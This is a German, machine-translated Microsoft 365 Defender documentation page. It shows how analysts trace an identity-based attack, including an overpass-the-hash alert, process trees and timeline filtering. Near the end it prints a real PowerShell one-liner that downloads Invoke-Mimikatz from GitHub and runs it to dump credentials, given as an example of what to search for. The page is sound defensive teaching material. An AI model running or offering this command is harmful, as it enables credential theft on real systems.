---
title: Beispiel für einen identitätsbasierten Angriff
description: Durchlaufen Sie eine Beispielanalyse eines identitätsbasierten Angriffs.
keywords: Vorfälle, Warnungen, untersuchen, Korrelation, Angriff, Computer, Geräte, Benutzer, Identitäten, Identität, Postfach, E-Mail, 365, Microsoft, m365, Reaktion auf Vorfälle, Cyberangriff
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 204530b8b4a87215053ddcb0434e40e45271da3d
ms.sourcegitcommit: 4fb1226d5875bf5b9b29252596855a6562cea9ae
ms.translationtype: MT
ms.contentlocale: de-DE
ms.lasthandoff: 06/08/2021
ms.locfileid: "52841006"
---
# <a name="example-of-an-identity-based-attack"></a>Beispiel für einen identitätsbasierten Angriff

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Gilt für:**
- Microsoft 365 Defender

Microsoft Defender for Identity kann dabei helfen, böswillige Versuche zu erkennen, Identitäten in Ihrer Organisation zu kompromittieren. Da Defender for Identity in Microsoft 365 Defender integriert ist, können Sicherheitsanalysten Einblicke in Bedrohungen haben, die von Defender for Identity ausgehen, z. B. verdächtige Rechteerweiterungsversuche von Netlogon.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Analysieren des Angriffs in Microsoft Defender for Identity

Microsoft 365 Defender ermöglicht Analysten das Filtern von Warnungen nach Erkennungsquelle auf der Registerkarte **"Warnungen"** der Seite "Vorfälle". Im folgenden Beispiel wird die Erkennungsquelle nach **Defender for Identity** gefiltert. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Beispiel für das Filtern der Erkennungsquelle für Defender for Identity":::

Die Auswahl der Warnung **"Verdächtiger Overpass-the-Hash-Angriff"** führt zu einer Seite in Microsoft Cloud App Security, die ausführlichere Informationen anzeigt. Sie können immer mehr über eine Warnung oder einen Angriff erfahren, indem **Sie weitere Informationen zu diesem Warnungstyp** auswählen, um eine Beschreibung des [Angriffs](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) sowie Korrekturvorschläge zu lesen.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Beispiel für eine Warnung bei einem verdächtigen Overpass-the-Hash-Angriff"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Untersuchen desselben Angriffs in Microsoft Defender für Endpunkt

Alternativ kann ein Analyst Defender für Endpunkt verwenden, um mehr über die Aktivität an einem Endpunkt zu erfahren. Wählen Sie den Vorfall aus der Vorfallwarteschlange aus, und wählen Sie dann die Registerkarte **"Warnungen"** aus. Von hier aus können sie auch die Erkennungsquelle identifizieren. Eine Als EDR bezeichnete Erkennungsquelle steht für Endpunkterkennung und -antwort, bei der es sich um Defender für Endpunkt handelt. Von hier aus wählt der Analyst eine Warnung aus, die von EDR erkannt wurde.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Beispiel für eine Endpunkterkennung und -antwort in Defender für Endpunkt"::: 

Auf der Warnungsseite werden verschiedene relevante Informationen angezeigt, z. B. der betroffene Gerätename, Benutzername, Status der automatischen Untersuchung und die Warnungsdetails. Die Warnungsmeldung stellt eine visuelle Darstellung der Prozessstruktur dar. Die Prozessstruktur ist eine hierarchische Darstellung der übergeordneten und untergeordneten Prozesse im Zusammenhang mit der Warnung.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Beispiel für eine Warnungsprozessstruktur in Defender für Endpunkt"::: 

Jeder Prozess kann erweitert werden, um weitere Details anzuzeigen. Details, die ein Analyst sehen kann, sind die tatsächlichen Befehle, die als Teil eines schädlichen Skripts eingegeben wurden, ip-Adressen für ausgehende Verbindungen und andere nützliche Informationen.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Beispiel für Prozessdetails in Defender für Endpunkt":::
 
Durch Die Auswahl von **"Auf Zeitachse** anzeigen" kann ein Analyst noch einen Drilldown ausführen, um den genauen Zeitpunkt des Kompromittierungstermins zu ermitteln. 

Microsoft Defender für Endpunkt kann viele schädliche Dateien und Skripts erkennen. Aufgrund vieler legitimer Verwendungsmöglichkeiten für ausgehende Verbindungen, PowerShell und Befehlszeilenaktivität würden einige Aktivitäten jedoch als gutartig betrachtet, bis eine schädliche Datei oder Aktivität erstellt wird. Daher hilft die Verwendung der Zeitachse Analysten, die Warnung in einen Kontext mit der umgebenden Aktivität zu setzen, um die ursprüngliche Quelle oder uhrzeit des Angriffs zu bestimmen, die andernfalls durch allgemeine Dateisystem- und Benutzeraktivitäten verdeckt wird. 

Dazu würde ein Analyst zum Zeitpunkt der Warnungserkennung (in Rot) beginnen und einen Bildlauf rückwärts ausführen, um zu bestimmen, wann die ursprüngliche Aktivität, die zu der böswilligen Aktivität geführt hat, tatsächlich gestartet wurde. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Beispiel für den Beginn zum Zeitpunkt der Warnungserkennung"::: 

Es ist wichtig, allgemeine Aktivitäten wie Windows Updateverbindungen, Windows vertrauenswürdigen Softwareaktivierungsdatenverkehr, andere häufige Verbindungen mit Microsoft-Websites, Internetaktivitäten von Drittanbietern, Microsoft Endpoint Configuration Manager Aktivitäten und andere gutartige Aktivitäten von verdächtigen Aktivitäten zu verstehen und zu unterscheiden. Eine Möglichkeit, dies zu erreichen, ist die Verwendung von Zeitachsenfiltern. Es gibt viele Filter, die bestimmte Aktivitäten hervorheben können, während sie alles herausfiltern, was der Analyst nicht anzeigen möchte. 

In der Abbildung unten hat der Analyst gefiltert, um nur Netzwerk- und Prozessereignisse anzuzeigen. Auf diese Weise kann der Analyst die Netzwerkverbindungen und Prozesse sehen, die das Ereignis umgeben, bei denen Editor eine Verbindung mit einer IP-Adresse hergestellt haben, die wir auch in der Prozessstruktur gesehen haben. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Beispiel dafür, wie Editor verwendet wurde, um eine schädliche ausgehende Verbindung herzustellen"::: 

In diesem bestimmten Fall wurde Editor verwendet, um eine schädliche ausgehende Verbindung herzustellen. Angreifer verwenden jedoch häufig einfach iexplorer.exe, um Verbindungen zum Herunterladen einer schädlichen Nutzlast herzustellen, da normalerweise iexplorer.exe Prozesse als reguläre Webbrowseraktivitäten betrachtet werden.

Ein weiteres Element, nach dem in der Zeitachse gesucht werden soll, ist PowerShell, das für ausgehende Verbindungen verwendet wird. Der Analyst suchte nach erfolgreichen PowerShell-Verbindungen mit Befehlen, z. B. `IEX (New-Object Net.Webclient)` gefolgt von einer ausgehenden Verbindung zu einer Website, die eine schädliche Datei hostet. 

Im folgenden Beispiel wurde PowerShell zum Herunterladen und Ausführen von Mimikatz von einer Website verwendet:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
Ein Analyst kann schnell nach Schlüsselwörtern suchen, indem er das Schlüsselwort in der Suchleiste eingibt, um nur mit PowerShell erstellte Ereignisse anzuzeigen. 

## <a name="next-step"></a>Nächster Schritt

Sehen Sie sich den Pfad der [Phishing-Untersuchung](first-incident-path-phishing.md) an.

## <a name="see-also"></a>Siehe auch

- [Übersicht über Vorfälle](incidents-overview.md)
- [Verwalten von Vorfällen](manage-incidents.md)
- [Untersuchen von Vorfällen](investigate-incidents.md)
